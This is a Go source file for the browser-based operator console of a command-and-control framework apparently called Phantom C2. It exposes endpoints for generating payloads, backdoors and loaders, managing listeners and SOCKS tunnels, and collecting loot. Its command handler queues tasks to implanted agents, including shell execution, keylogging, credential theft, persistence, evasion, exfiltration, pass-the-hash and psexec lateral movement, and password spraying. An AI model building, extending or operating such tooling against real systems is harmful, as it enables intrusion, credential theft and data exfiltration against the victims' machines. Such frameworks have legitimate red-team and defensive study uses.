package webui

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/server"
	"github.com/phantom-c2/phantom/internal/util"
)

// WebUI serves a full interactive browser-based interface for Phantom C2.
type WebUI struct {
	server   *server.Server
	bindAddr string
	auth     *WebAuth
}

// New creates a new WebUI instance.
func New(srv *server.Server, bindAddr string) *WebUI {
	return &WebUI{server: srv, bindAddr: bindAddr, auth: NewWebAuth()}
}

// Start launches the web UI HTTP server.
func (w *WebUI) Start() error {
	mux := http.NewServeMux()

	// Auth pages (no auth required)
	mux.HandleFunc("/login", w.auth.HandleLogin)
	mux.HandleFunc("/logout", w.auth.HandleLogout)

	// Dashboard (auth required)
	mux.HandleFunc("/", w.auth.AuthMiddleware(w.handleDashboard))

	// Read API (auth required)
	mux.HandleFunc("/api/agents", w.auth.AuthMiddleware(w.handleAPIAgents))
	mux.HandleFunc("/api/listeners", w.auth.AuthMiddleware(w.handleAPIListeners))
	mux.HandleFunc("/api/tasks", w.auth.AuthMiddleware(w.handleAPITasks))
	mux.HandleFunc("/api/events", w.auth.AuthMiddleware(w.handleAPIEvents))
	mux.HandleFunc("/api/agent/", w.auth.AuthMiddleware(w.handleAPIAgentDetail))

	// Action API (auth required)
	mux.HandleFunc("/api/cmd", w.auth.AuthMiddleware(w.handleAPICommand))
	mux.HandleFunc("/api/agent/remove", w.auth.AuthMiddleware(w.handleAgentRemove))

	// Payload generation API (auth required)
	mux.HandleFunc("/api/payload/generate", w.auth.AuthMiddleware(w.handlePayloadGenerate))
	mux.HandleFunc("/api/payload/types", w.auth.AuthMiddleware(w.handlePayloadTypes))
	mux.HandleFunc("/api/payload/apps", w.auth.AuthMiddleware(w.handlePayloadAppTemplates))
	mux.HandleFunc("/api/payload/download", w.auth.AuthMiddleware(w.handlePayloadDownload))
	mux.HandleFunc("/api/payload/history", w.auth.AuthMiddleware(w.handlePayloadHistory))
	mux.HandleFunc("/api/payload/backdoor", w.auth.AuthMiddleware(w.handleBackdoorGenerate))
	mux.HandleFunc("/api/payload/backdoor/types", w.auth.AuthMiddleware(w.handleBackdoorTypes))
	mux.HandleFunc("/api/payload/backdoor/binary", w.auth.AuthMiddleware(w.handleBinaryBackdoor))
	mux.HandleFunc("/api/payload/loader", w.auth.AuthMiddleware(w.handleLoaderGenerate))

	// Listener management API (auth required)
	mux.HandleFunc("/api/listener/create", w.auth.AuthMiddleware(w.handleListenerCreate))
	mux.HandleFunc("/api/listener/start", w.auth.AuthMiddleware(w.handleListenerAction))
	mux.HandleFunc("/api/listener/stop", w.auth.AuthMiddleware(w.handleListenerAction))
	mux.HandleFunc("/api/presets", w.auth.AuthMiddleware(w.handlePresets))

	// SOCKS Tunnel API (auth required)
	mux.HandleFunc("/api/tunnel/start", w.auth.AuthMiddleware(w.handleTunnelStart))
	mux.HandleFunc("/api/tunnel/stop", w.auth.AuthMiddleware(w.handleTunnelStop))
	mux.HandleFunc("/api/tunnel/list", w.auth.AuthMiddleware(w.handleTunnelList))

	// Loot & advanced features (auth required)
	mux.HandleFunc("/api/loot", w.auth.AuthMiddleware(w.handleLoot))
	mux.HandleFunc("/api/agent/rename", w.auth.AuthMiddleware(w.handleAgentRename))
	mux.HandleFunc("/api/autotasks", w.auth.AuthMiddleware(w.handleAutoTasks))
	mux.HandleFunc("/api/auditlog", w.auth.AuthMiddleware(w.handleAuditLog))
	mux.HandleFunc("/api/templates", w.auth.AuthMiddleware(w.handleCmdTemplates))

	// BOF catalog, plugins & lateral movement
	mux.HandleFunc("/api/bof/catalog", w.auth.AuthMiddleware(w.handleBOFCatalog))
	mux.HandleFunc("/api/plugins", w.auth.AuthMiddleware(w.handlePlugins))
	mux.HandleFunc("/api/transfers", w.auth.AuthMiddleware(w.handleTransfers))

	// API keys
	mux.HandleFunc("/api/keys", w.auth.AuthMiddleware(w.handleAPIKeys))

	// Task queue
	mux.HandleFunc("/api/taskqueue", w.auth.AuthMiddleware(w.handleTaskQueue))

	// File upload to agent
	mux.HandleFunc("/api/upload-to-agent", w.auth.AuthMiddleware(w.handleUploadToAgent))

	// New features (auth required)
	mux.HandleFunc("/api/notes", w.auth.AuthMiddleware(w.handleAgentNotes))
	mux.HandleFunc("/api/search", w.auth.AuthMiddleware(w.handleSearchOutput))
	mux.HandleFunc("/api/operators", w.auth.AuthMiddleware(w.handleOperators))
	mux.HandleFunc("/api/filebrowser", w.auth.AuthMiddleware(w.handleFileBrowser))
	mux.HandleFunc("/api/screenshot", w.auth.AuthMiddleware(w.handleScreenshotRequest))
	mux.HandleFunc("/api/processlist", w.auth.AuthMiddleware(w.handleProcessList))

	httpServer := &http.Server{
		Addr:         w.bindAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	return httpServer.ListenAndServe()
}

// ──────── Read API ────────

func (w *WebUI) handleAPIAgents(rw http.ResponseWriter, r *http.Request) {
	agents, _ := w.server.AgentMgr.List()
	w.server.AgentMgr.RefreshStatuses()

	type agentResp struct {
		ID       string `json:"id"`
		Name     string `json:"name"`
		OS       string `json:"os"`
		Hostname string `json:"hostname"`
		Username string `json:"username"`
		IP       string `json:"ip"`
		Sleep    string `json:"sleep"`
		LastSeen string `json:"last_seen"`
		Status   string `json:"status"`
	}

	var resp []agentResp
	for _, a := range agents {
		resp = append(resp, agentResp{
			ID:       a.ID,
			Name:     a.Name,
			OS:       a.OS,
			Hostname: a.Hostname,
			Username: a.Username,
			IP:       a.ExternalIP,
			Sleep:    fmt.Sprintf("%ds/%d%%", a.Sleep, a.Jitter),
			LastSeen: util.TimeAgo(a.LastSeen),
			Status:   a.Status,
		})
	}
	if resp == nil {
		resp = []agentResp{}
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPIAgentDetail(rw http.ResponseWriter, r *http.Request) {
	// /api/agent/<name-or-id>
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		http.Error(rw, "missing agent id", 400)
		return
	}
	agentRef := parts[3]

	a, _ := w.server.AgentMgr.Get(agentRef)
	if a == nil {
		http.Error(rw, "agent not found", 404)
		return
	}

	tasks, _ := w.server.TaskDisp.GetTaskHistory(a.ID)

	type taskItem struct {
		ID     string `json:"id"`
		Type   string `json:"type"`
		Args   string `json:"args"`
		Status string `json:"status"`
		Time   string `json:"time"`
		Output string `json:"output"`
		Error  string `json:"error"`
	}

	var taskList []taskItem
	for _, t := range tasks {
		output := ""
		errStr := ""
		result, _ := w.server.TaskDisp.GetResult(t.ID)
		if result != nil {
			if len(result.Output) > 0 {
				output = string(result.Output)
			}
			errStr = result.Error
		}
		taskList = append(taskList, taskItem{
			ID:     util.ShortID(t.ID),
			Type:   protocol.TaskTypeName(uint8(t.Type)),
			Args:   strings.Join(t.Args, " "),
			Status: protocol.StatusName(uint8(t.Status)),
			Time:   util.TimeAgo(t.CreatedAt),
			Output: output,
			Error:  errStr,
		})
	}

	resp := map[string]interface{}{
		"id":           a.ID,
		"name":         a.Name,
		"os":           a.OS,
		"arch":         a.Arch,
		"hostname":     a.Hostname,
		"username":     a.Username,
		"internal_ip":  a.InternalIP,
		"external_ip":  a.ExternalIP,
		"pid":          a.PID,
		"process_name": a.ProcessName,
		"sleep":        a.Sleep,
		"jitter":       a.Jitter,
		"first_seen":   util.FormatTimestamp(a.FirstSeen),
		"last_seen":    util.FormatTimestamp(a.LastSeen),
		"status":       a.Status,
		"tasks":        taskList,
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPIListeners(rw http.ResponseWriter, r *http.Request) {
	listeners := w.server.ListenerMgr.List()

	type listenerResp struct {
		Name   string `json:"name"`
		Type   string `json:"type"`
		Bind   string `json:"bind"`
		Status string `json:"status"`
	}

	var resp []listenerResp
	for _, l := range listeners {
		status := "stopped"
		if l.IsRunning() {
			status = "running"
		}
		resp = append(resp, listenerResp{
			Name: l.Name, Type: strings.ToUpper(l.Type), Bind: l.BindAddr, Status: status,
		})
	}
	if resp == nil {
		resp = []listenerResp{}
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPITasks(rw http.ResponseWriter, r *http.Request) {
	agents, _ := w.server.AgentMgr.List()

	type taskResp struct {
		ID     string `json:"id"`
		Agent  string `json:"agent"`
		Type   string `json:"type"`
		Args   string `json:"args"`
		Status string `json:"status"`
		Time   string `json:"time"`
		Output string `json:"output"`
	}

	var resp []taskResp
	for _, a := range agents {
		tasks, _ := w.server.TaskDisp.GetTaskHistory(a.ID)
		for _, t := range tasks {
			output := ""
			result, _ := w.server.TaskDisp.GetResult(t.ID)
			if result != nil && len(result.Output) > 0 {
				output = string(result.Output)
				if len(output) > 2000 {
					output = output[:2000] + "..."
				}
			}
			resp = append(resp, taskResp{
				ID: util.ShortID(t.ID), Agent: a.Name,
				Type: protocol.TaskTypeName(uint8(t.Type)), Args: strings.Join(t.Args, " "),
				Status: protocol.StatusName(uint8(t.Status)), Time: util.TimeAgo(t.CreatedAt),
				Output: output,
			})
		}
	}
	if resp == nil {
		resp = []taskResp{}
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPIEvents(rw http.ResponseWriter, r *http.Request) {
	writeJSON(rw, w.server.EventLog)
}

// ──────── Action API (Interactive) ────────

func (w *WebUI) handleAPICommand(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}

	body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))

	var req struct {
		Agent   string `json:"agent"`
		Command string `json:"command"`
		Args    string `json:"args"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		writeJSON(rw, map[string]string{"error": "invalid JSON"})
		return
	}

	// Resolve agent
	agent, _ := w.server.AgentMgr.Get(req.Agent)
	if agent == nil {
		writeJSON(rw, map[string]string{"error": "agent not found: " + req.Agent})
		return
	}

	// Parse command and queue task
	var taskType uint8
	var args []string

	if req.Args != "" {
		args = strings.Fields(req.Args)
	}

	switch strings.ToLower(req.Command) {
	case "shell":
		taskType = protocol.TaskShell
		if req.Args != "" {
			args = []string{req.Args} // Keep full command as one arg
		}
	case "sysinfo":
		taskType = protocol.TaskSysinfo
	case "ifconfig", "ipconfig":
		taskType = protocol.TaskIfconfig
	case "ps":
		taskType = protocol.TaskProcessList
	case "screenshot":
		taskType = protocol.TaskScreenshot
	case "download":
		taskType = protocol.TaskDownload
	case "persist":
		taskType = protocol.TaskPersist
	case "sleep":
		taskType = protocol.TaskSleep
	case "cd":
		taskType = protocol.TaskCd
	case "kill":
		taskType = protocol.TaskKill
	case "upload":
		taskType = protocol.TaskUpload
	case "ad":
		taskType = protocol.TaskAD
	case "evasion":
		taskType = protocol.TaskEvasion
	case "token":
		taskType = protocol.TaskToken
	case "keylog":
		taskType = protocol.TaskKeylog
	case "socks":
		taskType = protocol.TaskSocks
	case "portfwd":
		taskType = protocol.TaskPortFwd
	case "creds":
		taskType = protocol.TaskCreds
	case "pivot":
		taskType = protocol.TaskPivot
	case "lateral", "wmiexec", "winrm", "psexec", "pth":
		taskType = protocol.TaskLateral
		if req.Command != "lateral" {
			args = append([]string{req.Command}, args...)
		}
	case "exfil":
		taskType = protocol.TaskExfil
	case "assembly":
		taskType = protocol.TaskAssembly
	case "initaccess", "portscan", "spray", "netdiscover":
		taskType = protocol.TaskInitAccess
		if req.Command != "initaccess" {
			args = append([]string{req.Command}, args...)
		}
	default:
		// Check for AD commands
		if strings.HasPrefix(req.Command, "ad-") {
			taskType = protocol.TaskAD
			args = append([]string{req.Command}, args...)
		} else {
			// Treat as shell command
			taskType = protocol.TaskShell
			args = []string{req.Command + " " + req.Args}
		}
	}

	task, err := w.server.TaskDisp.CreateTask(agent.ID, taskType, args, nil)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	// Audit log
	session := w.auth.ValidateRequest(r)
	operator := "unknown"
	if session != nil {
		operator = session.Username
	}
	AddAuditEntry(operator, agent.Name, protocol.TaskTypeName(taskType), req.Command+" "+req.Args)

	writeJSON(rw, map[string]string{
		"status":  "queued",
		"task_id": task.ID,
		"agent":   agent.Name,
		"type":    protocol.TaskTypeName(taskType),
	})
}

// ──────── Dashboard ────────

func (w *WebUI) handleAgentRemove(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}
	var req struct {
		ID string `json:"id"`
	}
	json.NewDecoder(r.Body).Decode(&req)
	if req.ID == "" {
		writeJSON(rw, map[string]string{"error": "agent id required"})
		return
	}
	if err := w.server.AgentMgr.Remove(req.ID); err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(rw, map[string]string{"status": "removed"})
}

func (w *WebUI) handleDashboard(rw http.ResponseWriter, r *http.Request) {
	rw.Header().Set("Content-Type", "text/html; charset=utf-8")
	rw.Write([]byte(dashboardHTML))
}

func writeJSON(rw http.ResponseWriter, data interface{}) {
	rw.Header().Set("Content-Type", "application/json")
	rw.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(rw).Encode(data)
}
